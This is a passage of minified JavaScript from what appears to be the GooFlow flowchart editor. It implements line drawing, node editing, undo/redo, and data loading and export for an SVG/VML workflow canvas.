a,s,r=_mouseP(t),n=_elCsys(this);a=r.x-n.left+this.parentNode.scrollLeft,s=r.y-n.top+this.parentNode.scrollTop;var l=document.getElementById("GooFlow_tmp_line");o?""!==GooFlow.prototype.useSVG?(l.childNodes[0].setAttribute("d","M "+o.x+" "+o.y+" L "+a+" "+s),l.childNodes[1].setAttribute("d","M "+o.x+" "+o.y+" L "+a+" "+s),'url("#arrow2")'===l.childNodes[1].getAttribute("marker-end")?l.childNodes[1].setAttribute("marker-end","url(#arrow3)"):l.childNodes[1].setAttribute("marker-end","url(#arrow2)")):l.points.value=o.x+","+o.y+" "+a+","+s:i&&(""!==GooFlow.prototype.useSVG?(l.childNodes[0].setAttribute("d","M "+a+" "+s+" L "+i.x+" "+i.y),l.childNodes[1].setAttribute("d","M "+a+" "+s+" L "+i.x+" "+i.y),'url("#arrow2")'===l.childNodes[1].getAttribute("marker-end")?l.childNodes[1].setAttribute("marker-end","url(#arrow3)"):l.childNodes[1].setAttribute("marker-end","url(#arrow2)")):l.points.value=a+","+s+" "+i.x+","+i.y)}}}),this.$workArea.mouseup({inthis:this},function(t){var e=t.data.inthis;if("direct"===e.$nowType||"dashed"===e.$nowType||e.$mpTo.data("p")){var o=document.getElementById("GooFlow_tmp_line");o?($(this).css("cursor","auto").removeData("lineStart").removeData("lineEnd"),e.$mpTo.hide().removeData("p"),e.$mpFrom.hide().removeData("p"),e.$draw.removeChild(o),e.focusItem(e.$focus,!1)):e.$lineOper.removeData("tid")}}),this.$textArea=$("<textarea></textarea>"),this.$bgDiv.append(this.$textArea),this.$lineMove=$('<div class="GooFlow_linemove" style="display:none"></div>'),this.$workArea.append(this.$lineMove),this.$lineMove.on("mousedown",{inthis:this},function(t){if(2===t.button)return!1;$(this).css({"background-color":"#333"});var o,i,a=t.data.inthis,e=_mouseP(t),s=_elCsys(a.$workArea[0]);o=e.x-s.left+a.$workArea[0].parentNode.scrollLeft,i=e.y-s.top+a.$workArea[0].parentNode.scrollTop;var r=a.$lineMove.position(),n=o-r.left,l=i-r.top,h=!1;document.onmousemove=function(t){t||(t=window.event);var e=_mouseP(t);o=e.x-s.left+a.$workArea[0].parentNode.scrollLeft,i=e.y-s.top+a.$workArea[0].parentNode.scrollTop,"lr"===a.$lineMove.data("type")?((o-=n)<0?o=0:o>a.$workArea.width()&&(o=a.$workArea.width()),a.$lineMove.css({left:o+"px"})):"tb"===a.$lineMove.data("type")&&((i-=l)<0?i=0:i>a.$workArea.height()&&(i=a.$workArea.height()),a.$lineMove.css({top:i+"px"})),h=!0},document.onmouseup=function(){if(h){var t=a.$lineMove.position();"lr"===a.$lineMove.data("type")?a.setLineM(a.$lineMove.data("tid"),(t.left+3)/a.$scale):"tb"===a.$lineMove.data("type")&&a.setLineM(a.$lineMove.data("tid"),(t.top+3)/a.$scale)}a.$lineMove.css({"background-color":"transparent"}),a.$focus===a.$lineMove.data("tid")&&a.focusItem(a.$lineMove.data("tid")),document.onmousemove=null,document.onmouseup=null}}),this.$lineOper=$("<div class='GooFlow_line_oper' style='display:none'><i class='b_l1'></i><i class='b_l2'></i><i class='b_l3'></i><i class='b_x'></i></div>"),this.$workArea.parent().append(this.$lineOper),this.$lineOper.on("click",{inthis:this},function(t){if(t||(t=window.event),"I"===t.target.tagName){var e=t.data.inthis,o=$(this).data("tid");switch($(t.target).attr("class")){case"b_x":e.delLine(o),this.style.display="none";break;case"b_l1":e.setLineType(o,"lr");break;case"b_l2":e.setLineType(o,"tb");break;case"b_l3":e.setLineType(o,"sl")}}}),this.$mpFrom=$("<div class='GooFlow_line_mp' style='display:none'></div>"),this.$mpTo=$("<div class='GooFlow_line_mp' style='display:none'></div>"),this.$workArea.append(this.$mpFrom).append(this.$mpTo),this._initLinePointsChg(),t&&(this.$undoStack=[],this.$redoStack=[],this.$isUndo=0,this._checkStack=function(t){null!==this.$head&&(t&&"undo"!==t||(0===this.$undoStack.length?this.$head.find(".ico_undo").parent().addClass("a_disabled"):this.$head.find(".ico_undo").parent().removeClass("a_disabled")),t&&"redo"!==t||(0===this.$redoStack.length?this.$head.find(".ico_redo").parent().addClass("a_disabled"):this.$head.find(".ico_redo").parent().removeClass("a_disabled")))},this.pushOper=function(t,e){1===this.$isUndo?(this.$redoStack.push([t,e]),this.$isUndo=0,50<this.$redoStack.length&&this.$redoStack.shift(),this._checkStack("redo")):(this.$undoStack.push([t,e]),50<this.$undoStack.length&&this.$undoStack.shift(),0===this.$isUndo&&this.$redoStack.splice(0,this.$redoStack.length),this.$isUndo=0,this._checkStack())},this.pushExternalOper=function(t,e){this.pushOper("externalFunc",[t,e])},this.undo=function(){if(0!==this.$undoStack.length){this.blurItem();var t=this.$undoStack.pop();this.$isUndo=1,"externalFunc"===t[0]?t[1][0](t[1][1]):this[t[0]](t[1][0],t[1][1],t[1][2],t[1][3],t[1][4],t[1][5],t[1][6],t[1][7],t[1][8],t[1][9],t[1][10],t[1][11]),this._checkStack()}},this.redo=function(){if(0!==this.$redoStack.length){this.blurItem();var t=this.$redoStack.pop();this.$isUndo=2,"externalFunc"===t[0]?t[1][0](t[1][1]):this[t[0]](t[1][0],t[1][1],t[1][2],t[1][3],t[1][4],t[1][5],t[1][6],t[1][7],t[1][8],t[1][9],t[1][10],t[1][11]),this._checkStack()}}),$(document).keydown({inthis:this},function(t){var e=t.data.inthis;if(""!==e.$focus)switch(t.keyCode){case 46:e.delNode(e.$focus,!0),e.delLine(e.$focus)}})},bindHeadBtnEvent:function(t){null!=this.$head&&(this.$headBtnEvents=t)},setNodeRemarks:function(t){null!=this.$tool&&this.$tool.children("a").each(function(){try{this.title=t[$(this).attr("id").split("btn_")[1]]}catch(t){}})},setHeadToolsRemarks:function(t){null!=this.$head&&this.$head.children("a").each(function(){try{this.title=t[$(this).children("i").attr("class").split("ico_")[1]]}catch(t){}})},setExtWorkRemarks:function(t){this.$workArea.children(".Gooflow_extend_right").attr("title",t.extendRight),this.$workArea.children(".Gooflow_extend_bottom").attr("title",t.extendBottom)},switchToolBtn:function(t){if(null!=this.$tool&&this.$tool.children("#"+this.$id+"_btn_"+this.$nowType.split(" ")[0]).attr("class","GooFlow_tool_btn"),"group"===this.$nowType)for(var e in this.$workArea.prepend(this.$group),this.$areaDom)this.$areaDom[e].addClass("lock").children("div:eq(1)").css("display","none");if(this.$nowType=t,null!=this.$tool&&this.$tool.children("#"+this.$id+"_btn_"+t.split(" ")[0]).attr("class","GooFlow_tool_btndown"),"group"===this.$nowType)for(var o in this.blurItem(),this.$workArea.append(this.$group),this.$areaDom)this.$areaDom[o].removeClass("lock").children("div:eq(1)").css("display","");else"direct"!==this.$nowType&&"dashed"!==this.$nowType||this.blurItem();this.$textArea&&"none"===this.$textArea.css("display")&&this.$textArea.removeData("id").val("").hide()},getItemInfo:function(t,e){switch(e){case"node":return this.$nodeData[t]||null;case"line":return this.$lineData[t]||null;case"area":return this.$areaData[t]||null}},blurItem:function(){if(""!==this.$focus){var t=$("#"+this.$focus);if("DIV"===t.prop("tagName")){if("function"==typeof this.onItemBlur&&!1===this.onItemBlur(this.$focus,"node"))return!1;t.removeClass("item_focus").children("div:eq(0)").css("display","none"),this.$nodeData[this.$focus].marked&&t.addClass("item_mark").css("border-color",GooFlow.color.mark)}else{if("function"==typeof this.onItemBlur&&!1===this.onItemBlur(this.$focus,"line"))return!1;""!==GooFlow.prototype.useSVG?this.$lineData[this.$focus].marked||(t[0].childNodes[1].setAttribute("stroke",GooFlow.color.line),t[0].childNodes[1].setAttribute("marker-end","url(#arrow1)")):this.$lineData[this.$focus].marked||(t[0].strokeColor=GooFlow.color.line),this.$editable&&(this.$lineMove.hide().removeData("type").removeData("tid"),this.$lineOper.hide().removeData("tid"),this.$mpFrom.hide().removeData("p"),this.$mpTo.hide().removeData("p"))}}return this.$focus="",!0},focusItem:function(t,e){var o=$("#"+t);if(0!==o.length&&this.blurItem()&&(!e||"function"!=typeof this.onItemFocus||!1!==this.onItemFocus(t,"node"))){if(this.$focus=t,"DIV"===o.prop("tagName"))o.addClass("item_focus"),GooFlow.color.line&&o.css("border-color",GooFlow.color.line),this.$editable&&o.children("div:eq(0)").css("display","block");else{if(""!==GooFlow.prototype.useSVG?(o[0].childNodes[1].setAttribute("stroke",GooFlow.color.mark),o[0].childNodes[1].setAttribute("marker-end","url(#arrow2)")):o[0].strokeColor=GooFlow.color.mark,!this.$editable)return;var i,a,s,r,n;""!==GooFlow.prototype.useSVG?(s=o.attr("from").split(","),r=o.attr("to").split(","),n=[s[0],s[1],r[0],r[1]]):(s=[(n=o[0].getAttribute("fromTo").split(","))[0],n[1]],r=[n[2],n[3]]),s[0]=parseInt(s[0],10),s[1]=parseInt(s[1],10),r[0]=parseInt(r[0],10),r[1]=parseInt(r[1],10),"lr"===this.$lineData[t].type?(s[0]=this.$lineData[t].M*this.$scale,r[0]=s[0],this.$lineMove.css({width:"5px",height:(r[1]-s[1])*(r[1]>s[1]?1:-1)+"px",left:s[0]-3+"px",top:(r[1]>s[1]?s[1]:r[1])+1+"px",cursor:"e-resize",display:"block"}).data({type:"lr",tid:t})):"tb"===this.$lineData[t].type&&(s[1]=this.$lineData[t].M*this.$scale,r[1]=s[1],this.$lineMove.css({width:(r[0]-s[0])*(r[0]>s[0]?1:-1)+"px",height:"5px",left:(r[0]>s[0]?s[0]:r[0])+1+"px",top:s[1]-3+"px",cursor:"s-resize",display:"block"}).data({type:"tb",tid:t})),i=(s[0]+r[0])/2-40,a=(s[1]+r[1])/2+4,this.$lineOper.css({display:"block",left:i+"px",top:a+"px"}).data("tid",t),this.$editable&&(this.$mpFrom.css({display:"block",left:n[0]-4+"px",top:n[1]-4+"px"}).data("p",n[0]+","+n[1]),this.$mpTo.css({display:"block",left:n[2]-4+"px",top:n[3]-4+"px"}).data("p",n[2]+","+n[3])),this.$draw.appendChild(o[0])}this.switchToolBtn("cursor")}},_node2Area:function(t){if(null!==this.$group){var e=this.$nodeData[t],o=!1;for(var i in this.$areaData){var a=this.$areaData[i];if(e.left>=a.left&&e.left<a.left+a.width&&e.top>=a.top&&e.top<a.top+a.height){e.areaId=i,o=!0;break}}o||delete e.areaId}},addNode:function(t,e){if("function"!=typeof this.onItemAdd||!1!==this.onItemAdd(t,"node",e)){this.$undoStack&&this.$editable&&this.pushOper("delNode",[t]);var o=e.marked?" item_mark":"";e.type.indexOf(" round")<0?((!e.width||e.width<104)&&(e.width=104),(!e.height||e.height<26)&&(e.height=26),(!e.top||e.top<0)&&(e.top=0),(!e.left||e.left<0)&&(e.left=0),this.$nodeDom[t]=$("<div class='GooFlow_item"+o+"' id='"+t+"' style='top:"+e.top*this.$scale+"px;left:"+e.left*this.$scale+"px'><table cellspacing='1' style='width:"+(e.width*this.$scale-2)+"px;height:"+(e.height*this.$scale-2)+"px;'><tr><td class='ico'><i class='ico_"+e.type+"'></i></td><td><div>"+e.name+"</div></td></tr></table><div style='display:none'><div class='rs_bottom'></div><div class='rs_right'></div><div class='rs_rb'></div><div class='rs_close'></div></div></div>")):(e.width=26,e.height=26,this.$nodeDom[t]=$("<div class='GooFlow_item item_round"+o+"' id='"+t+"' style='top:"+e.top*this.$scale+"px;left:"+e.left*this.$scale+"px'><table cellspacing='0' style='width:"+(e.width*this.$scale-2)+"px;height:"+(e.height*this.$scale-2)+"px;'><tr><td class='ico'><i class='ico_"+e.type+"'></i></td></tr></table><div  style='display:none'><div class='rs_close'></div></div><div class='span'>"+e.name+"</div></div>")),GooFlow.color.node&&(-1<e.type.indexOf(" mix")?(this.$nodeDom[t].css({"background-color":GooFlow.color.mix,"border-color":GooFlow.color.mix}),GooFlow.color.mixFont&&(this.$nodeDom[t].find("td:eq(1)").css("color",GooFlow.color.mixFont),this.$nodeDom[t].find(".span").css("color",GooFlow.color.mixFont))):this.$nodeDom[t].css({"background-color":GooFlow.color.node,"border-color":GooFlow.color.node}),o&&GooFlow.color.mark&&this.$nodeDom[t].css({"border-color":GooFlow.color.mark})),-1<e.type.indexOf(" mix")&&this.$nodeDom[t].addClass("item_mix");var i=navigator.userAgent.toLowerCase();-1!==i.indexOf("msie")&&-1!==i.indexOf("8.0")&&this.$nodeDom[t].css("filter","progid:DXImageTransform.Microsoft.Shadow(color=#94AAC2,direction=135,strength=2)"),this.$workArea.append(this.$nodeDom[t]),this.$nodeData[t]=e,++this.$nodeCount,this.$editable&&(this.$nodeData[t].alt=!0,this._node2Area(t),this.$deletedItem[t]&&delete this.$deletedItem[t])}},moveNode:function(t,e,o){if(this.$nodeData[t]&&("function"!=typeof this.onItemMove||!1!==this.onItemMove(t,"node",e,o))){if(this.$undoStack){var i=[t,this.$nodeData[t].left,this.$nodeData[t].top];this.pushOper("moveNode",i)}e<0&&(e=0),o<0&&(o=0),$("#"+t).css({left:e*this.$scale+"px",top:o*this.$scale+"px"}),this.$nodeData[t].left=e,this.$nodeData[t].top=o,this.resetLines(t,this.$nodeData[t]),this.$editable&&(this.$nodeData[t].alt=!0,this._node2Area(t))}},setName:function(t,e,o){var i;if("node"===o){if(!this.$nodeData[t])return;if(this.$nodeData[t].name===e)return;if("function"==typeof this.onItemRename&&!1===this.onItemRename(t,e,"node"))return;if(i=this.$nodeData[t].name,this.$nodeData[t].name=e,1<this.$nodeData[t].type.indexOf("round"))this.$nodeDom[t].children(".span").text(e);else{this.$nodeDom[t].find("td:eq(1)").children("div").text(e);var a=this.$nodeDom[t].outerWidth(),s=this.$nodeDom[t].outerHeight();if(this.$nodeData[t].width!==a||this.$nodeData[t].height!==s){if(this.$nodeDom[t].children("table").css({width:a-2+"px",height:s-2+"px"}),this.$undoStack){var r=[t,this.$nodeData[t].width,this.$nodeData[t].height];this.pushOper("resizeNode",r)}this.$nodeData[t].width=a,this.$nodeData[t].height=s}}this.$editable&&(this.$nodeData[t].alt=!0),this.resetLines(t,this.$nodeData[t])}else if("line"===o){if(!this.$lineData[t])return;if(this.$lineData[t].name===e)return;if("function"==typeof this.onItemRename&&!1===this.onItemRename(t,e,"node"))return;if(i=this.$lineData[t].name,this.$lineData[t].name=e,""!==GooFlow.prototype.useSVG)this.$lineDom[t].childNodes[2].textContent=e;else{this.$lineDom[t].childNodes[1].innerHTML=e;var n,l=this.$lineDom[t].getAttribute("fromTo").split(",");if("lr"!==this.$lineData[t].type)n=(l[2]-l[0])/2;else{var h=l[2]>l[0]?l[0]:l[2];h>this.$lineData[t].M&&(h=this.$lineData[t].M),n=this.$lineData[t].M-h}n<0&&(n*=-1),this.$lineDom[t].childNodes[1].style.left=n-this.$lineDom[t].childNodes[1].offsetWidth/2+4+"px"}this.$editable&&(this.$lineData[t].alt=!0)}else if("area"===o){if(!this.$areaData[t])return;if(this.$areaData[t].name===e)return;if("function"==typeof this.onItemRename&&!1===this.onItemRename(t,e,"node"))return;i=this.$areaData[t].name,this.$areaData[t].name=e,this.$areaDom[t].children("label").text(e),this.$editable&&(this.$areaData[t].alt=!0)}if(this.$undoStack){var d=[t,i,o];this.pushOper("setName",d)}},resizeNode:function(t,e,o){if(this.$nodeData[t]&&("function"!=typeof this.onItemResize||!1!==this.onItemResize(t,"node",e,o))&&"start"!==this.$nodeData[t].type&&"end"!==this.$nodeData[t].type){if(this.$undoStack){var i=[t,this.$nodeData[t].width,this.$nodeData[t].height];this.pushOper("resizeNode",i)}this.$nodeDom[t].children("table").css({width:(e-2)*this.$scale+"px",height:(o-2)*this.$scale+"px"}),e=this.$nodeDom[t].outerWidth(),o=this.$nodeDom[t].outerHeight(),this.$nodeDom[t].children("table").css({width:e-2+"px",height:o-2+"px"}),this.$nodeData[t].width=e,this.$nodeData[t].height=o,this.$editable&&(this.$nodeData[t].alt=!0),this.resetLines(t,this.$nodeData[t]),this._node2Area(t)}},delNode:function(t,e){if(this.$nodeData[t]&&(!1===e||"function"!=typeof this.onItemDel||!1!==this.onItemDel(t,"node"))){for(var o in this.$lineData)this.$lineData[o].from!==t&&this.$lineData[o].to!==t||this.delLine(o,!1);if(this.$undoStack){var i=[t,this.$nodeData[t]];this.pushOper("addNode",i)}delete this.$nodeData[t],this.$nodeDom[t].remove(),delete this.$nodeDom[t],--this.$nodeCount,this.$focus===t&&(this.$focus=""),this.$editable&&(this.$deletedItem[t]="node")}},setTitle:function(t){this.$title=t,this.$head&&this.$head.children("label").attr("title",t).text(t)},_suitSize:function(){var t=0,e=0;for(var o in this.$nodeData){var i=this.$nodeData[o];t<i.width+i.left&&(t=i.width+i.left),e<i.height+i.top&&(e=i.height+i.top)}for(var a in this.$areaData){var s=this.$areaData[a];t<s.width+s.left&&(t=s.width+s.left),e<s.height+s.top&&(e=s.height+s.top)}for(var r in this.$lineData){var n=this.$lineData[r];n.M&&"lt"===n.type&&t<n.M&&(t=M+4),n.M&&"tb"===n.type&&e<n.M&&(e=M+4)}return{width:t,height:e}},loadData:function(t){var e=this.$editable;for(var o in this.$editable=!1,t.title&&this.setTitle(t.title),t.initNum&&(this.$max=t.initNum),t.nodes)this.addNode(o,t.nodes[o]);for(var i in t.lines)this.addLine(i,t.lines[i]);for(var a in t.areas)this.addArea(a,t.areas[a]);this.$editable=e,this.$deletedItem={};for(var s=this.$workArea.width(),r=this.$workArea.height(),n=this._suitSize();n.width>s;)s+=this.$workExtendStep;for(;n.height>r;)r+=this.$workExtendStep;this.$workArea.css({height:r+"px",width:s+"px"}),""===GooFlow.prototype.useSVG&&(this.$draw.coordsize=s+","+r),this.$draw.style.width=s+"px",this.$draw.style.height=r+"px",null!=this.$group&&this.$group.css({height:r+"px",width:s+"px"})},loadDataAjax:function(i){var e=this;$.ajax({type:i.type,url:i.url,dataType:"json",data:i.data,success:function(t){i.dataFilter&&i.dataFilter(t,"json"),e.loadData(t),i.success&&i.success(t)},error:function(t,e,o){i.error&&i.error(e,o)}})},exportData:function(){var t={};for(var e in t.title=this.$title,t.nodes={},t.lines={},t.areas={},t.initNum=this.$max,this.$nodeData)this.$nodeData[e].marked||delete this.$nodeData[e].marked,t.nodes[e]=JSON.parse(JSON.stringify(this.$nodeData[e]));for(var o in this.$lineData)this.$lineData[o].marked||delete this.$lineData[o].marked,t.lines[o]=JSON.parse(JSON.stringify(this.$lineData[o]));for(var i in this.$areaData)this.$areaData[i].marked||delete this.$areaData[i].marked,t.areas[i]=JSON.parse(JSON.stringify(this.$areaData[i]));return t},exportAlter:function(){var t={nodes:{},lines:{},areas:{}};for(var e in this.$nodeData)this.$nodeData[e].alt&&(t.nodes[e]=this.$nodeData[e]);for(var o in this.$lineData)this.$lineData[o].alt&&(t.lines[o]=this.$lineData[o]);for(var i in this.$areaData)this.$areaData[i].alt&&(t.areas[i]=this.$areaData[i]);return t.deletedItem=this.$deletedItem,t},transNewId:function(t,e,o){var i;switch(o){case"node":this.$nodeData[t]&&(i=this.$nodeData[t],delete this.$nodeData[t],this.$nodeData[e]=i,i=this.$nodeDom[t].attr("id",e),delete this.$nodeDom[t],this.$nodeDom[e]=i);break;case"line":this.$lineData[t]&&(i=this.$lineData[t],delete this.$lineData[t],this.$lineData[e]=i,i=this.$lineDom[t].attr("id",e),delete this.$lineDom[t],this.$lineDom[e]=i);break;case"area":this.$areaData[t]&&(i=this.$areaData[t],delete this.$areaData[t],this.$areaData[e]=i,i=this.$areaDom[t].attr("id",e),delete this.$areaDom[t],this.$areaDom[e]=i)}},clearData:function(){for(var t in this.$nodeData)this.delNode(t);for(var e in this.$lineData)this.delLine(e);for(var o in this.$areaData)this.delArea(o);this.$deletedItem={}},destrory:function(){this.$bgDiv.empty(),this.$lineData=null,this.$nodeData=null,this.$lineDom=null,this.$nodeDom=null,this.$areaDom=null,this.$areaData=null,this.$nodeCount=0,this.$areaCount=0,this.$areaCount=0,this.$deletedItem={}},drawLine:function(t,e,o,i,a,s){var r,n,l=(o[0]+e[0])/2,h=(o[1]+e[1])/2;if(""!==GooFlow.prototype.useSVG){r=document.createElementNS("http://www.w3.org/2000/svg","g");var d=document.createElementNS("http://www.w3.org/2000/svg","path"),c=document.createElementNS("http://www.w3.org/2000/svg","path");""!==t&&r.setAttribute("id",t),r.setAttribute("from",e[0]+","+e[1]),r.setAttribute("to",o[0]+","+o[1]),d.setAttribute("visibility","hidden"),d.setAttribute("stroke-width","9"),d.setAttribute("fill","none"),d.setAttribute("stroke","white"),d.setAttribute("d","M "+e[0]+" "+e[1]+" L "+o[0]+" "+o[1]),d.setAttribute("pointer-events","stroke"),c.setAttribute("d","M "+e[0]+" "+e[1]+" L "+o[0]+" "+o[1]),c.setAttribute("stroke-width",i?"2.4":"1.4"),c.setAttribute("stroke-linecap","round"),c.setAttribute("fill","none"),a&&c.setAttribute("style","stroke-dasharray:6,5"),i?(c.setAttribute("stroke",GooFlow.color.mark),c.setAttribute("marker-end","url(#arrow2)")):(c.setAttribute("stroke",GooFlow.color.line),c.setAttribute("marker-end","url(#arrow1)")),r.appendChild(d),r.appendChild(c),r.style.cursor="crosshair",""!==t&&"GooFlow_tmp_line"!==t&&((n=document.createElementNS("http://www.w3.org/2000/svg","text")).setAttribute("fill",GooFlow.color.lineFont),r.appendChild(n),n.setAttribute("text-anchor","middle"),n.setAttribute("x",l+""),n.setAttribute("y",h+""),n.style.cursor="text",n.style.fontSize=14*s+"px",r.style.cursor="pointer")}else r=document.createElement("v:polyline"),""!==t&&(r.id=t),r.points.value=e[0]+","+e[1]+" "+o[0]+","+o[1],r.setAttribute("fromTo",e[0]+","+e[1]+","+o[0]+","+o[1]),r.strokeWeight="1.2",r.stroke.EndArrow="Block",r.style.cursor="crosshair",""!==t&&"GooFlow_tmp_line"!==t&&(n=document.createElement("div"),r.appendChild(n),l<0&&(l*=-1),h<0&&(h*=-1),n.style.left=l+"px",n.style.top=h-6+"px",n.style.color=GooFlow.color.lineFont,n.style.fontSize=14*s+"px",r.style.cursor="pointer"),a&&(r.stroke.dashStyle="Dash"),r.strokeColor=i?GooFlow.color.mark:GooFlow.color.line,r.fillColor=GooFlow.color.line;return r},drawPoly:function(t,e,o,i,a,s,r,n){var l,h,d,c=(i[0]+o[0])/2,$=(i[1]+o[1])/2;if(""!==GooFlow.prototype.useSVG){l=document.createElementNS("http://www.w3.org/2000/svg","g");var p=document.createElementNS("http://www.w3.org/2000/svg","path"),u=document.createElementNS("http://www.w3.org/2000/svg","path");""!==t&&l.setAttribute("id",t),l.setAttribute("from",e[0]+","+e[1]),l.setAttribute("to",a[0]+","+a[1]),p.setAttribute("visibility","hidden"),p.setAttribute("stroke-width","9"),p.setAttribute("fill","none"),p.setAttribute("stroke","white"),h="M "+e[0]+" "+e[1],o[0]===e[0]&&o[1]===e[1]||(h+=" L "+o[0]+" "+o[1]),i[0]===a[0]&&i[1]===a[1]||(h+=" L "+i[0]+" "+i[1]),h+=" L "+a[0]+" "+a[1],p.setAttribute("d",h),p.setAttribute("pointer-events","stroke"),u.setAttribute("d",h),u.setAttribute("stroke-width",s?"2.4":"1.4"),u.setAttribute("stroke-linecap","round"),u.setAttribute("fill","none"),r&&u.setAttribute("style","stroke-dasharray:6,5"),s?(u.setAttribute("stroke",GooFlow.color.mark),u.setAttribute("marker-end","url(#arrow2)")):(u.setAttribute("stroke",GooFlow.color.line),u.setAttribute("marker-end","url(#arrow1)")),l.appendChild(p),l.appendChild(u),(d=document.createElementNS("http://www.w3.org/2000/svg","text")).setAttribute("fill",GooFlow.color.lineFont),l.appendChild(d),d.setAttribute("text-anchor","middle"),d.setAttribute("x",c+""),d.setAttribute("y",$+""),d.style.cursor="text"}else l=document.createElement("v:Polyline"),""!==t&&(l.id=t),l.filled="false",h=e[0]+","+e[1],o[0]===e[0]&&o[1]===e[1]||(h+=" "+o[0]+","+o[1]),i[0]===a[0]&&i[1]===a[1]||(h+=" "+i[0]+","+i[1]),h+=" "+a[0]+","+a[1],l.points.value=h,l.setAttribute("fromTo",e[0]+","+e[1]+","+a[0]+","+a[1]),l.strokeWeight=s?"2.4":"1.2",l.stroke.EndArrow="Block",d=document.createElement("div"),l.appendChild(d),c<0&&(c*=-1),$<0&&($*=-1),d.style.left=c+"px",d.style.top=$-4+"px",d.style.color=GooFlow.color.lineFont,r&&(l.stroke.dashStyle="Dash"),l.strokeColor=s?GooFlow.color.mark:GooFlow.color.line;return l.style.cursor="pointer",d.style.fontSize=14*n+"px",l},addLineDom:function(t,e){var o,i=this.$nodeData[e.from],a=this.$nodeData[e.to];if(i&&a&&(o=e.type&&"sl"!==e.type?calcPolyPoints(i,a,e.type,e.M,this.$scale):calcStartEnd(i,a,this.$scale)))if("sl"===e.type?this.$lineDom[t]=GooFlow.prototype.drawLine(t,o.start,o.end,e.marked,e.dash,this.$scale):this.$lineDom[t]=GooFlow.prototype.drawPoly(t,o.start,o.m1,o.m2,o.end,e.marked,e.dash,this.$scale),this.$draw.appendChild(this.$lineDom[t]),""===GooFlow.prototype.useSVG)if(this.$lineDom[t].childNodes[1].innerHTML=e.name,"sl"!==e.type){var s=o.start[0]>o.end[0]?o.end[0]:o.start[0];s>o.m2[0]&&(s=o.m2[0]),s>o.m1[0]&&(s=o.m1[0]),this.$lineDom[t].childNodes[1].style.left=(o.m2[0]+o.m1[0])/2-s-this.$lineDom[t].childNodes[1].offsetWidth/2+4,(s=o.start[1]>o.end[1]?o.end[1]:o.start[1])>o.m2[1]&&(s=o.m2[1]),s>o.m1[1]&&(s=o.m1[1]),this.$lineDom[t].childNodes[1].style.top=(o.m2[1]+o.m1[1])/2-s-this.$lineDom[t].childNodes[1].offsetHeight/2}else this.$lineDom[t].childNodes[1].style.left=((o.end[0]-o.start[0])*(o.end[0]>o.start[0]?1:-1)-this.$lineDom[t].childNodes[1].offsetWidth)/2+4;else this.$lineDom[t].childNodes[2].textContent=e.name},addLine:function(t,e){if(("function"!=typeof this.onItemAdd||!1!==this.onItemAdd(t,"line",e))&&(this.$undoStack&&this.$editable&&this.pushOper("delLine",[t]),e.from!==e.to)){var o=this.$nodeData[e.from],i=this.$nodeData[e.to];if(o&&i){for(var a in this.$lineData)if(e.from===this.$lineData[a].from&&e.to===this.$lineData[a].to&&e.dash===this.$lineData[a].dash)return;this.$lineData[t]={},e.type?(this.$lineData[t].type=e.type,this.$lineData[t].M=e.M):this.$lineData[t].type="sl",this.$lineData[t].from=e.from,this.$lineData[t].to=e.to,this.$lineData[t].name=e.name,e.marked?this.$lineData[t].marked=e.marked:this.$lineData[t].marked=!1,e.dash?this.$lineData[t].dash=e.dash:this.$lineData[t].dash=!1,this.addLineDom(t,this.$lineData[t]),++this.$lineCount,this.$editable&&(this.$lineData[t].alt=!0,this.$deletedItem[t]&&delete this.$deletedItem[t])}}},resetLines:function(t,e){for(var o in this.$lineData){var i,a=null;if(this.$lineData[o].from===t){if(null==(a=this.$nodeData[this.$lineData[o].to]||null))continue;if(!(i="sl"===this.$lineData[o].type?calcStartEnd(e,a,this.$scale):calcPolyPoints(e,a,this.$lineData[o].type,this.$lineData[o].M,this.$scale)))break}else if(this.$lineData[o].to===t){if(null==(a=this.$nodeData[this.$lineData[o].from]||null))continue;if(!(i="sl"===this.$lineData[o].type?calcStartEnd(a,e,this.$scale):calcPolyPoints(a,e,this.$lineData[o].type,this.$lineData[o].M,this.$scale)))break}if(null!=a)if(this.$draw.removeChild(this.$lineDom[o]),"sl"===this.$lineData[o].type?this.$lineDom[o]=GooFlow.prototype.drawLine(o,i.start,i.end,this.$lineData[o].marked,this.$lineData[o].dash,this.$scale):this.$lineDom[o]=GooFlow.prototype.drawPoly(o,i.start,i.m1,i.m2,i.end,this.$lineData[o].marked,this.$lineData[o].dash,this.$scale),this.$draw.appendChild(this.$lineDom[o]),""===GooFlow.prototype.useSVG)if(this.$lineDom[o].childNodes[1].innerHTML=this.$lineData[o].name,"sl"!==this.$lineData[o].type){var s=i.start[0]>i.end[0]?i.end[0]:i.start[0];s>i.m2[0]&&(s=i.m2[0]),s>i.m1[0]&&(s=i.m1[0]),this.$lineDom[o].childNodes[1].style.left=(i.m2[0]+i.m1[0])/2-s-this.$lineDom[o].childNodes[1].offsetWidth/2+4,(s=i.start[1]>i.end[1]?i.end[1]:i.start[1])>i.m2[1]&&(s=i.m2[1]),s>i.m1[1]&&(s=i.m1[1]),this.$lineDom[o].childNodes[1].style.top=(i.m2[1]+i.m1[1])/2-s-this.$lineDom[o].childNodes[1].offsetHeight/2-4}else this.$lineDom[o].childNodes[1].style.left=((i.end[0]-i.start[0])*(i.end[0]>i.start[0]?1:-1)-this.$lineDom[o].childNodes[1].offsetWidth)/2+4;else this.$lineDom[o].childNodes[2].textContent=this.$lineData[o].name}},setLineType:function(t,e,o){if(!e||null==e||""===e||e===this.$lineData[t].type)return!1;if("function"!=typeof this.onLineSetType||!1!==this.onLineSetType(t,e)){if(this.$undoStack){var i=[t,this.$lineData[t].type,this.$lineData[t].M];this.pushOper("setLineType",i)}var a,s=this.$lineData[t].from,r=this.$lineData[t].to;if("sl"!==(this.$lineData[t].type=e))o?this.setLineM(t,o,!0):this.setLineM(t,getMValue(this.$nodeData[s],this.$nodeData[r],e),!0);else{if(delete 